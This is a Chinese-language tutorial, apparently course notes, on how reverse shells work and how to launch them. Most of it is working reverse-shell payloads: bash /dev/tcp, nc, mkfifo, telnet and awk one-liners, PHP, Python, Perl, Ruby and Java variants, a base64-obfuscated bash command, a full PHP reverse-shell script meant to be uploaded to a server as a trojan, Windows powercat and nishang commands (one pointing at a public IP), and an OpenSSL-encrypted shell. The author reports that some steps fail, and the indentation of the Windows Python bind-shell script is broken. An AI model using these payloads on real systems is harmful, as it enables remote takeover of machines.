[TOC]



# ==反弹shell原理与实现==

教材内容

#### 一、理解反弹Shell

##### 1、为什么需要反弹Shell？

假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标IP: 目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，Web服务，SSH，SMB等等，都是正向连接。

那么什么情况下正向连接不太好用了呢？

（1）某客户机中了你的木马，但是它在局域网内，你直接连接不了。它的IP会动态改变，你不能持续控制。
（2）由于防火墙或局域网等限制，对方机器只能发送请求，不能主动接收请求。
（3）对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。

那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。

##### 2、反弹Shell的基本原理

反弹shell（reverse shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。

#### 二、常用的反弹Shell命令

##### 1、使用Bash进行反弹

Windows作为攻击者主机，Linux是被入侵主机（目标主机），此时目标主机上只要能正常运行Linux命令便可以实现反弹，利用Linux的Bash命令重定向和Windows上的Netcat应用程序，如果没有，则网络下载netcat应用程序即可。

（1）在Windows上启动端口监听

```shell
C:\Users\Denny>nc -lvp 6666
listening on [any] 6666 ...

# 参数 l 代表入站监听，v 代表输出信息级别，p 指定监听的端口，具体的参数解释可直接 nc -h 查看# 端口可以是任意端口，只要不被防火墙阻挡并且没有被占用就行，比如80，443等
```

（2）在Linux上运行反弹命令：

```shell
bash -i >& /dev/tcp/192.168.230.1/6666 0>&1 

bash -i       # 打开一个交互的bash
>&           # 将标准错误输出合并并重定向到标准输出，也可以写成 &> 
/dev/tcp/192.168.230.1/6666       #意为调用socket,建立socket连接,其中192.168.230.1为要反弹到的主机IP，6666为端口
0>&1          # 标准输入重定向到标准输出，实现你与反弹出来的shell的交互，可以接受用户输入，0>&1 和 0<&1 是相同的作用
/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。

在 bash 命令执行的过程中，主要有三种输出入的状况，分别是：
1. 标准输入：代码为 0 ；或称为 stdin ；使用的方式为 <
2. 标准输出：代码为 1 ；或称为 stdout；使用的方式为 1>
3. 错误输出：代码为 2 ；或称为 stderr；使用的方式为 2>
```

（3）反弹成功后在Windows上执行命令

```shell
C:\Users\hp>nc -lvp 6666
listening on [any] 6666 ...
192.168.230.147: inverse host lookup failed: h_errno 11004: NO_DATA
connect to [192.168.230.1] from (UNKNOWN) [192.168.230.147] 44618: NO_DATA
[root@mycentos ~]# pwd
pwd
/root
[root@mycentos ~]# whoami
whoami
root
[root@mycentos security]# uname -a
uname -a
Linux mycentos 3.10.0-1160.118.1.el7.x86_64 #1 SMP Wed Apr 24 16:01:50 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

直接将Windows上的反弹Shell结束，Linux的进程也相应退出。

##### 2、使用exec执行Shell的方式

```shell
exec 5<> /dev/tcp/192.168.230.1/6666; cat <&5 | while read line; do $line 2>&5 >&5; done

# 注意此时在Windows端没有提示符，直接运行命令
```

![image-20240918154920574](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918154920574.png)

##### 4、使用nc进行反弹

要实现监听，先需要确保在Linux上已经成功安装nc，使用 yum install nc 完成安装。Kali上自带nc，可以直接使用。

（1）在攻击机上启动nc监听

```
nc -lvp 6666
```

（2）在CentOS上反弹

```
nc -e /bin/bash 192.168.230.1 6666
```

![image-20240918160836117](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918160836117.png)

当然，也可以直接反弹到Windows，原理是一样的。某些版本的nc没有-e参数(非传统版),则可使用以下方式解决。

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.230.1 6666 >/tmp/f
```

##### 5、使用telnet进行反弹

（1）在攻击机上启动两个端口，一个用来输入，一个用来输出

```
nc -lvp 6666
nc -lvp 8888
```

（2）在目标机上启动反弹

```
telnet 192.168.230.1 6666 | /bin/bash | telnet 192.168.230.1 8888
```

默认情况下，CentOS没有自带telnet，直接yum install telnet安装即可，Kali内置。

![image-20240918161241519](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918161241519.png)

##### 6、使用awk进行反弹

```shell
awk 'BEGIN{s="/inet/tcp/0/192.168.230.1/6666";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

![image-20240918161528095](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918161528095.png)

这个方法只能单纯的执行指令，不能单独敲回车

#### 三、基于编程语言反弹Shell

##### 1、基于PHP的反弹

如果PHP没有在环境变量中，则指定PHP的绝对路径即可。

> ```
> vi /etc/profile
> 
> 粘贴下方内容，注意修改路径
> PATH=$PATH:/opt/lampp/bin/
> export PATH
> 
> source /etc/profile
> ```

```php
php -r '$sock=fsockopen("192.168.230.1", 6666); exec("/bin/sh -i <&3 >&3 2>&3");'
```

![image-20240918162840606](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918162840606.png)

上面的常规方法有个问题，如果在 webshell 里执行如上代码的话，会把系统的标准输入输出重定向到 /bin/sh 里，导致php-fpm直接502，然后弹的shell也会瞬间掉了，这个方式比较粗鲁。我们在运用中只希望新创建的进程(/bin/sh)的标准输入输出重定向到socket中，不去动系统的东西。改进后的代码如下：

```php
php -r '$sock=fsockopen("192.168.230.1", 6666);$descriptorspec = array(0 => $sock,1 => $sock,2 => $sock);$process = proc_open("/bin/sh", $descriptorspec, $pipes);proc_close($process);'
```

![image-20240918163123795](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918163123795.png)

如果上传的木马无法反弹时，可以上传以下脚本（Windows和Linux通用），当通过浏览器访问该PHP页面时，实现反弹：

```php
<?php 
error_reporting (E_ERROR);
ignore_user_abort(true);
ini_set('max_execution_time',0);
$os = substr(PHP_OS,0,3);
$ipaddr = '192.168.230.1';
$port = '6666';
$descriptorspec = array(0 => array("pipe","r"),1 => array("pipe","w"),2 => array("pipe","w"));
$cwd = getcwd();
$msg = php_uname()."\n------------Code by Spider-------------\n";if($os == 'WIN') {    
	$env = array('path' => 'c:\\windows\\system32');
} 
else {    
	$env = array('path' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
}
if(function_exists('fsockopen')) {    
	$sock = fsockopen($ipaddr,$port);    
	fwrite($sock,$msg);    
	while ($cmd = fread($sock,1024)) {        
		if (substr($cmd,0,3) == 'cd ') {            
			$cwd = trim(substr($cmd,3,-1));            
			chdir($cwd);            
			$cwd = getcwd();        
			}        
		if (trim(strtolower($cmd)) == 'exit') {            
			break;        
		} 
        else {            
			$process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);            
				if (is_resource($process)) {                
					fwrite($pipes[0],$cmd);                
					fclose($pipes[0]);                
					$msg = stream_get_contents($pipes[1]);                
					fwrite($sock,$msg);                
					fclose($pipes[1]);                
					$msg = stream_get_contents($pipes[2]);                
					fwrite($sock,$msg);                
					fclose($pipes[2]);                
					proc_close($process);            
				}        
			}    
		}    
		fclose($sock);
	} 
	else {    
		$sock = socket_create(AF_INET,SOCK_STREAM,SOL_TCP);    
		socket_connect($sock,$ipaddr,$port);    
		socket_write($sock,$msg);    
		fwrite($sock,$msg);    
         while ($cmd = socket_read($sock,1024)) {        
             if (substr($cmd,0,3) == 'cd ') {            
                 $cwd = trim(substr($cmd,3,-1));            
                 chdir($cwd);            
                 $cwd = getcwd();        
             }        
             if (trim(strtolower($cmd)) == 'exit') {            
                 break;        
             } 
             else {            
                 $process = proc_open($cmd,$descriptorspec,$pipes,$cwd,$env);            
                 if (is_resource($process)) {                
                     fwrite($pipes[0],$cmd);                
                     fclose($pipes[0]);                
                     $msg = stream_get_contents($pipes[1]);                
                     socket_write($sock,$msg,strlen($msg));                
                     fclose($pipes[1]);                
                     $msg = stream_get_contents($pipes[2]);                
                     socket_write($sock,$msg,strlen($msg));                
                     fclose($pipes[2]);                
                     proc_close($process);            
                 }        
             }    
         }    
        socket_close($sock);
    }
?>
```

![image-20240918165923202](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918165923202.png)

当然，也可以使用更为简单的脚本

```php
<?php
    system("bash -c 'bash -i >& /dev/tcp/192.168.230.1/6666 0>&1'");
?>
```



##### 2、基于Python实现反弹

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.230.1",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

新建一个socket，并将0、1、2分别代表系统的stdin、stdout、stderr（标准输入、输出、错误）重定向到socket中，然后开启一个shell。这样我们从socket中传来的命令就会进入系统的标准输入（就跟键盘输入的效果一样了），系统的输出和错误就会重定向到socket中，被我们客户端获取。但这个弹shell脚本只能在linux下使用。

![image-20240918170224202](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918170224202.png)

利用以下Python代码可以开启一个本地交互式终端：

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

##### 3、基于Perl实现反弹

（1）基于/bin/sh反弹

```perl
perl -e 'use Socket;$i="192.168.230.1";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

（2）不依赖于/bin/bash的反弹

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.230.1:6666");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

##### 4、基于Ruby实现反弹

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.230.1","6666");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

在Windows环境下使用：

```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.230.188","6666");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

##### 5、基于Java实现反弹

```java
public class Revs {    
    /**    
    * @param args    
    * @throws Exception     
    */    
    public static void main(String[] args) throws Exception {        
        // TODO Auto-generated method stub        
        Runtime r = Runtime.getRuntime();        
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.230.1/6666;cat <&5 | while read line; do $line 2>&5 >&5; done"};        
        Process p = r.exec(cmd);        
        p.waitFor();    
    }
}
```

将上述偌复制到目标主机中，并且必须命名为：Revs.java (文件名必须与类名相同)，再运行以下两条命令实现反弹

```java
javac Revs.java   
# 编译源代码
java Revs          
# 执行程序
```

![image-20240918171214984](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918171214984.png)

##### 6、基于Base64编码实现反弹

```
bash -i >& /dev/tcp/192.168.230.1/6666 0>&1  ==>YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xLzQ0NDQgMD4mMQ==echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExMi4xLzQ0NDQgMD4mMQ== | base64 -d | bash
```

#### 四、Windows反弹到Linux

1、使用cmd命令

```
nc -e cmd 47.96.116.171 8088
```

2、使用powercat, https://github.com/besimorhino/powercat

```
powercat -c 47.96.116.171 -p 8088 -e cmd
```

3、使用nishang

```
Import-Module ./Invoke-PowerShellTcp.ps1Invoke-PowerShellTcp -Reverse -IPAddress 192.168.230.216 -Port 8088
```

#### 五、加密反弹Shell

##### 1、在攻击机上生成证书

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
然后输入证书信息，国家代码输入cn，其他随意
```

![image-20240918172309067](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918172309067.png)

##### 2、在攻击机上监听

```
openssl s_server -quiet -key key.pem -cert cert.pem -port 6666
```

![image-20240918172327301](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240918172327301.png)

##### 3、在目标机上执行反弹

```
mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.230.188:6666 > /tmp/s;rm /tmp/s
```

> 这个我有点执行不了


#### 六、正向连接脚本

##### 1、Linux下的正向连接

在目标主机上创建一个Python脚本，命名为：bind_conn.py

```python
from socket import *
import subprocess
import os, threading, sys, time

if __name__ == "__main__":        
    server=socket(AF_INET,SOCK_STREAM)        
    server.bind(('192.168.230.188',6666))        
    server.listen(5)        
    print 'waiting for connect'        
    talk, addr = server.accept()        
    print 'connect from',addr        
    proc = subprocess.Popen(["/bin/sh","-i"], stdin=talk,                
            stdout=talk, stderr=talk, shell=True)
```

在目标主机上执行上述代码，确保正常运行(python bind_conn.py)。然后在攻击主机上使用nc进行正向连接

```
nc 192.168.230.188 6666
```

> 这个我失败了

##### 2、Windows下的正向连接

```python
from socket import *
import subprocess
import os, threading
def send(talk, proc):        
    import time        
    while True:                
        msg = proc.stdout.readline()                
        talk.send(msg)
        if __name__ == "__main__":        
            server=socket(AF_INET,SOCK_STREAM)        
            server.bind(('192.168.230.1', 5555))        
            server.listen(5)        
            print('waiting for connect')        
            talk, addr = server.accept()        
            print('connect from',addr)        
            proc = subprocess.Popen('cmd.exe /K',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE, shell=True)        
            t = threading.Thread(target = send, args = (talk, proc))        
            t.setDaemon(True)        
            t.start()        
            while True:                
                cmd=talk.recv(1024)                
                proc.stdin.write(cmd)                
                proc.stdin.flush()        
                server.close()
```

> 对于print函数来说，Python3中需要加圆括号，而Python2中不需要，如果存在版本上的小差异，进行调试确认即可。

